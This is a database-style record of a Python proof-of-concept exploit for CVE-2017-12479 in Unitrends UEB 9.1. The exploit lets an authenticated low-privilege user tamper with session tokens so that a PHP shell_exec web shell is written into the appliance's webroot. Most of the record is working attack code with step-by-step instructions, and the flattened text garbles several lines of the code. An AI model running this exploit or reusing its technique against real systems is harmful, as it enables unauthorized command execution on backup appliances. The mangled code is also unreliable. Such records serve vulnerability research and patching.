{
    "text": "vul_name : Unitrends UEB 9.1 Privilege Escalation ， vul_cve : CVE-2017-12479 ， vul_poc :  # Exploit Title : Authenticated lowpriv RCE for Unitrends UEB 9.1 ，  # Date : 08/08/2017 ，  # Exploit Authors : Benny Husted , Jared Arave , Cale Smith ，  # Contact :  |  |  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 9.1 ，  # Tested on : CentOS6 ，  # CVE : CVE-2017-12479 ， from optparse import OptionParser ，  # Print some helpful words :  ， print \" ， Authenticated lowpriv RCE for Unitrends UEB 9.1 ， Tested against appliance versions :  ，  [ + ] 9.1.0-2.201611302120.CentOS6 ， This exploit utilizes some issues in UEB9 session handling to place a ， php exec one liner in the webroot of the appliance. ， Session tokens looks like this :  ， djA6NmM0ZWMzYTEtZmYwYi00MTIxLTk3YzYtMjQzODljM2EyNjY1OjE6L3Vzci9icC9sb2dzLmRpci9ndWlfcm9vdC5sb2c6MA= ， and decodes to this :  ， LOG_LVL - ,  ， v - UUID - v v - LOG_DIR -v v ， v0 : 6c4ec3a1-ff0b-4121-97c6-24389c3a2665 : 1 : /usr/bp/logs.dir/gui_root.log : 0 ， The general steps that are followed by this poc are :  ， 1. Authenticate as a low priv user and receive an auth token. ， 2. Modify the LOG_DIR field to point to a directory in the web root ， with apache user write access , and make a request to an arbitrary resource. ， This should touch a new file at the desired location. ， 3. Replace the UUID token in this auth token with a php shell_exec on liner ,  ， and modify the LOG_LVL parameter to a value of 5 , which will ensure ， that the UUID is reflected into the log file. ， 4. Issue a final request , to generate a shell.php file with a single shell_exec. ， This step is not strictly necessary. ， \" ，  # Disable SSL Cert validation ， ssl._create_default_https_context = ssl._create_unverified_context ，  # Parse command line args :  ， usage = \"Usage : %prog -r <appliance_ip> -u <username> -p <password>\\n\"\\ ， parser = OptionParser ( usage=usage )  ， parser.add_option ( \"-r\" , '-RHOST' , dest='rhost' , action=\"store\" ,  ， help=\"Target host w/ UNITRENDS UEB installation\" )  ， parser.add_option ( \"-u\" , '-username' , dest='username' , action=\"store\" ,  ， help=\"User with any amount of privilege on unitrends device\" )  ， parser.add_option ( \"-p\" , '-password' , dest='password' , action=\"store\" ,  ， help=\"password for this user\" )  ，  ( options , args ) = parser.parse_args (  )  ， parser.error ( \" [  !  ] No remote host specified.\\n\" )  ， elif options.rhost is None or options.username is None or options.password is None :  ， parser.print_help (  )  ， sys.exit ( 1 )  ， RHOST = options.rhost ， username = options.username ， password = options.password ，  # REQUEST ONE : GET A UUID. ， url1 = '/api/login' ， a = {\"username\" : username ,  ， \"password\" : password} ， post_body = json.dumps ( a )  ， headers1 = {'Host' : RHOST} ， print \" [ + ] Attempting to log in to {0} , {1} : {2}\".format ( RHOST , username , password )  ， conn = httplib.HTTPSConnection ( RHOST , 443 )  ， conn.set_debuglevel ( 0 )  ， conn.request ( \"POST\" , url1 , post_body , headers=headers1 )  ， r1 = conn.getresponse (  )  ，  # BUILD THE AUTH TOKENS THAT WE'LL USE IN AN ATTACK. ， parsed_json = json.loads ( r1.read (  )  ， print \" [  !  ] Didn't receive an auth token. Bad creds?\" ， exit (  )  ， auth_encoded = parsed_json [ 'auth_token' ]  ， auth_decoded = base64.b64decode ( auth_encoded )  ， uuid = auth_decoded.split ( ' : ' )  [ 1 ]  ， ssid = auth_decoded.split ( ' : ' )  [ 2 ]  ，  # We'll place our command shell in /var/www/html/tempPDF , since apache ，  # has rw in this dir. ， log_dir = \"/var/www/html/tempPDF/\" ， log_file = '.join ( random.choice ( string.ascii_lowercase ) for _ in range ( 5 ) + '.php' ， log_lvl = \"5\"",
    "time": "2017.10.06"
}